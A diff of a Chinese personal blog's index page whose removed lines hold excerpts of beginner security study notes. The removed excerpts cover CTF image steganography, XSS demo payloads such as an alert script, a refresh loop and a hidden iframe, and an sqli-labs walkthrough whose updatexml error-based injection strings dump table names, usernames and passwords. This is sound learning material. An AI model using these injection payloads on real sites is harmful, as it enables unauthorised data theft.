@@ -1,981 +1,186 @@
 <!DOCTYPE html>
-<html lang="zh-cmn-Hans">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Willianir&#39;s home</title>
-  
-  
-  
-  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
-  
-<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
-
-  
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="baidu-site-verification" content="vvVgSQUzPU" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
+    <meta name="keywords" content="虎虎|博客|个人|utone|Utone|">
+    <meta name="description" content="骑士恨煎蛋，骑士恨孜然">
+    
+    <title>
+       Willianir&#39;s home
+    </title>
+    
 <link rel="stylesheet" href="/css/style.css">
-
-<meta name="generator" content="Hexo 5.3.0"></head>
-
-<body>
-<div class="Shell">
-    <aside class='SideBar'>
-    <section class='avatar' style="background-image: url()">
-        <div class='av-pic' style="background-image: url()">
+ 
+    
+      <link rel="icon" href="/images/favicon.ico" />
+    
+  <meta name="generator" content="Hexo 5.3.0"></head>
+  <body>
+    <div id="container">
+      <div id="main-left">
+        <div id="introduce">
+          <div class="logo-worp">
+            <a href="/"><img class="logo" src="/images/logo.png" alt=""/></a>
+          </div>
+          <ul>
+            
+              <li><a href="/"> Home </a></li>
+            
+              <li><a href="/archives"> Archive </a></li>
+            
+              <li><a href="/about"> About </a></li>
+            
+              <li><a href="/atom.xml"> RSS </a></li>
+            
+            <li>
+              <img id="search-img" src="/images/search.svg" alt="search" />
+            </li>
+          </ul>
+          
         </div>
-    </section>
-    <section class='menu'>
-        <div>Willianir&#39;s home</div>
-        
-        <ul>
-          
-            <a href="/" class="Btn">
-              <li>Home</li>
-            </a>  
-          
-            <a href="/archives/" class="Btn">
-              <li>Archive</li>
-            </a>  
-          
-        </ul>
-    </section>
-    <section class="media">
-        
-    </section>
-</aside>
+      </div>
+      <div id="main-right">
 
-    <div class="container">
-        <div data-pager-shell>
-            <ul class="Index">
-  
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%EF%BC%88%E4%BA%8C%EF%BC%89/">图片隐写（二）</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:43.934Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="一-jpg"><a href="#一-jpg" class="headerlink" title="一.jpg"></a>一.jpg</h1><p>一切隐藏的事物无外乎依附于一个载体，从而达到加密的效果。因此当我们分析时需要充分了解载体，了解载体本身哪里可以隐藏。也就是说当面对图片隐写时，我们需要充分了解图片格式，比如在图片中的exif信息里面包含很多东西同时也可以进行修改，通过查看属性就可以发现。</p>
-<p>当我们查看本题：小黄人能有什么坏心思呢？<br><img  src="https://img-blog.csdnimg.cn/20210319195111600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>：<img  src="https://img-blog.csdnimg.cn/20210319195222315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>哇哦，flag出来了！<br>因此在查看图片的时候一定要发现所隐藏的载体在哪里从而进行判断。</p>
-<h1 id="二、LSB"><a href="#二、LSB" class="headerlink" title="二、LSB"></a>二、LSB</h1><p>LSB也就是最低有效位 ,原理就是图片中的像数一般是由<strong>三种颜色</strong>组成，即<strong>三原色</strong>，由<strong>这三种原色可以组成其他各种颜色</strong>，例如在PNG图片的储存中，每个颜色会有 8bit，LSB隐写就是<strong>修改了像数中的最低的1bit</strong>，在人眼看来是看不出来区别的，也把信息隐藏起来了<br><img  src="https://img-blog.csdnimg.cn/20210319204057456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>针对LSB这类的题目同样有一个神器：<strong>Stegsolve</strong><br>打开之后进行分析即可：<img  src="https://img-blog.csdnimg.cn/20210319204244780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210319204253248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210319204305576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>看到了什么？一个二维码继续！<img  src="https://img-blog.csdnimg.cn/20210319204337909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210319204638428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到了flag<br>如果隐写使用了ascii的话，可以使用Stegsolve——Analyse——Data Extract来查看ascii码。</p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%EF%BC%88%E4%BA%8C%EF%BC%89/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%EF%BC%88%E4%BA%8C%EF%BC%89/">
+            图片隐写（二）
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/XSS-%E5%88%9D%E6%8E%A2/">XSS初探</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:43.932Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。</p>
-<p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？</p>
-<p>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。</p>
-<p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
-<h1 id="一、XSS跨站脚本实例"><a href="#一、XSS跨站脚本实例" class="headerlink" title="一、XSS跨站脚本实例"></a>一、XSS跨站脚本实例</h1><p>在学习的过程中对于XSS的学习需要掌握两种语种：<code>JAVAScript</code>和<code>HTML</code><br>为了更好的了解XSS我们进行一下实例：<br><img  src="https://img-blog.csdnimg.cn/20210319095142799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>打开之后<img  src="https://img-blog.csdnimg.cn/20210319095251364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>在这段HTML代码中，包含了一个JAVAScript语句块，使用内置的alert()函数来打开消息框中内容，保存为HTML文件，打开后就会出现这个。我们来看一下XSS攻击的解释：<img  src="https://img-blog.csdnimg.cn/20210319095814391.png"  ><span class="image-caption">在这里插入图片描述</span><br>XSS弹出恶意警告框：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span>alert(&quot;XSS&quot;);<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
-<p>使网页不停刷新：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>meta http<span class="hljs-operator">-</span>equiv<span class="hljs-operator">=</span>&quot;refresh&quot; content<span class="hljs-operator">=</span>&quot;0;&quot;<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210319100346433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p>嵌入其他网站链接：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>iframe src<span class="hljs-operator">=</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com width<span class="hljs-operator">=</span><span class="hljs-number">0</span> heigh<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>iframe<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210319100521323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="二-、原理复现"><a href="#二-、原理复现" class="headerlink" title="二 、原理复现"></a>二 、原理复现</h1><p>index.php文件里写入如下代码:<br><img  src="https://img-blog.csdnimg.cn/20210319110150615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210319110216381.png"  ><span class="image-caption">在这里插入图片描述</span><br>随便输入：2342131<br><img  src="https://img-blog.csdnimg.cn/20210319110328683.png"  ><span class="image-caption">在这里插入图片描述</span><br>查看页面源代码<br><img  src="https://img-blog.csdnimg.cn/20210319110732687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p>可以发现我们输入的数字被完整的输出了，那么当我们使用弹窗测试是否存在xss漏洞输入：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>那么<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>应该也会出现在13行的<code>&lt;br&gt; &lt;br&gt;</code>中，let we to try!<br><img  src="https://img-blog.csdnimg.cn/20210319110835511.png"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><img  src="https://img-blog.csdnimg.cn/20210319110848272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>成功弹窗基本上就可以确定存在xss漏洞。</p>
-<p>查看页面的源代码<br><img  src="https://img-blog.csdnimg.cn/20210319110901403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="三、XSS分类"><a href="#三、XSS分类" class="headerlink" title="三、XSS分类"></a>三、XSS分类</h1><ul>
-<li>反射型xss攻击</li>
-<li>存贮型xss攻击</li>
-<li>DOMBasedXSS（基于dom的跨站点脚本攻击）<br>具体解释在这里就不说明了今天我们着重实操一下反射型</li>
-</ul>
-<h2 id="反射型："><a href="#反射型：" class="headerlink" title="反射型："></a>反射型：</h2><p>又<strong>称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</strong></p>
-<p><img  src="https://img-blog.csdnimg.cn/2021031910420730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><img  src="https://img-blog.csdnimg.cn/20210319104150592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>下面我们尝试注入Js语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210319104537237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>注入成功<br>其实在使用中弹窗的作用是为了测试xss的存在性和使用性。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>怎么讲，XSS学起来很不简单，并不是一两句话就可以讲明白，需要不断的进行学习以及尝试，对于我学起来确实很吃力，但也只能一步一步去看去走了。</p>
-<p>对了，学习XSS同样需要掌握它的语言可以去看看<a target="_blank" rel="noopener" href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">这里</a>，同样<strong>JAVAScript、HTML、PHP</strong>也需要不断学习。</p>
-<p>今天这篇文章写的很糙，这也说明我了解的太少，随着学习的深入希望也能总结的更加清晰吧。</p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/XSS-%E5%88%9D%E6%8E%A2/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/XSS-%E5%88%9D%E6%8E%A2/">
+            XSS初探
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/sqli-labs-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml%E6%8A%A5%E9%94%99/">sqli-labs-报错注入-updatexml报错</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:43.930Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>union注入是最简单方便的,但是要求页面必须有显示位,没有就没法利用.</p>
-<p>所以当页面没有显示位时,我们需要用其他方法来获取数据.因此我们可以使用报错注入: 有些网站在开发调试阶段开启了报错提示信息,如果没有关闭,就有可能存在报错注入.</p>
-<p>报错注入函数:</p>
-<ul>
-<li>floor函数</li>
-<li>extractvalue报错</li>
-<li>updatexml报错</li>
-</ul>
-<p>今天我在这里先记录一下对于<strong>updatexml报错</strong>函数的学习</p>
-<h1 id="一、updatexml报错"><a href="#一、updatexml报错" class="headerlink" title="一、updatexml报错"></a>一、updatexml报错</h1><p>基本格式: <code>?id=1  and updatexml(1,(payload),1)</code><br>举例:    <code>?id=1 and  updatexml(1, (concat(0x7e,(select @@version),0x7e)),1)</code></p>
-<p>在这里我们以sql-labs第五关进行操作：<br><strong>payload：</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="hljs-string">2.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string">4.?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314160622261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到是没有显示位的，因此不能进行联合查询注入-我们选择<strong>报错注入</strong></p>
-<p><strong>判断注入点</strong><br>当and 1=1 or and 1=2 时都显示不变<br><img  src="https://img-blog.csdnimg.cn/20210314161148263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>因此输入：<code>?id=1 &#39;</code>判断<img  src="https://img-blog.csdnimg.cn/20210314161311827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>确定注入类型为字符型注入</p>
-<p><strong>回显</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314161801691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>爆数据库</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314161910353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>爆表名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),0x7e),1) --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314162338958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>爆用户名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314162538479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>爆密码</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210314162631676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="二、updatexml报错记忆"><a href="#二、updatexml报错记忆" class="headerlink" title="二、updatexml报错记忆"></a>二、updatexml报错记忆</h1><p>操作一遍大家可以发现其实语法并不难，很便于记住：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select /*payload*/),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p>在回显中以及爆数据库这两步只需要改变/<em>payload</em>/即可</p>
-<p>爆表名虽然有一丢多：<code>?id=1 &#39; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39; limit 0,1),0x7e),1) --+</code></p>
-<p>那么爆用户名以及密码基本不需要怎么改变：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27; union select updatexml(1,concat(0x7e,(select group_concat(/*payload*/) from users),0x7e),1) --+</span><br></code></pre></td></tr></table></figure>
-<p>同样这两步也只需要改变/<em>payload</em>/</p>
-<p>其实这个多敲几遍也就记住了     –.–</p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/sqli-labs-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml%E6%8A%A5%E9%94%99/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/sqli-labs-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml%E6%8A%A5%E9%94%99/">
+            sqli-labs-报错注入-updatexml报错
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA(webshell%E4%B8%8Eweak_auth)/">攻防世界web新手区(webshell与weak_auth)</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:28.282Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="一-webshell"><a href="#一-webshell" class="headerlink" title="一.webshell"></a>一.webshell</h1><p><img  src="https://img-blog.csdnimg.cn/20210313155524571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>打开之后可以看到：<br><img  src="https://img-blog.csdnimg.cn/20210313155548447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p>本题考察的是一句话木马以及工具的使用<br>这里我们可以使用蚁剑操作<br><img  src="https://img-blog.csdnimg.cn/20210313160244399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>添加后点击地址<img  src="https://img-blog.csdnimg.cn/20210313160314744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到flag就在这里面<img  src="https://img-blog.csdnimg.cn/2021031316034039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
